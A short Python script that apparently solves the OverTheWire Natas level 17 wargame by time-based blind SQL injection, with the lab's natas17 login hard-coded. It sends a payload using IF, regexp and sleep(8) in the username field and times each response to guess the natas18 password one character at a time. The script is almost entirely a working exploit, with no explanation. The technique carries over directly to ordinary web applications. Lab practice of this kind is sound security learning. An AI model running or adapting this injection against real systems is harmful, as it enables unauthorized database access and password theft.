import requests
import lxml.html
import random

url = "http://natas17.natas.labs.overthewire.org/"
session = requests.Session()
session.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

# Initialize
print(session.get(url).elapsed.total_seconds())

# Benchmark
benchmark = session.get(url).elapsed.total_seconds() + 7
print(benchmark)


def elapsed(injection):
    return session.post(url, data={"username": injection}).elapsed.total_seconds()

# print(elapsed(injection))

letterRange = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
shuffled = list(letterRange)
random.shuffle(shuffled)
letterRange = ''.join(shuffled)

passkey = ""
for i in range(0, 32):
    print(f"--- {i} ---")
    periods = "." * i
    for letter in letterRange:
        injection = f"natas18\" - IF(cast(password as binary) regexp '^{periods}{letter}', sleep(8), null) #"

        print(injection)
        
        marker = ''
        time = elapsed(injection)
        if time > benchmark:
            marker = '>>> '
        print(f"{marker} {letter} : {time}")

        # if elapsed(injection) > benchmark :
            # passkey += letter
            # print(passkey)
            # break
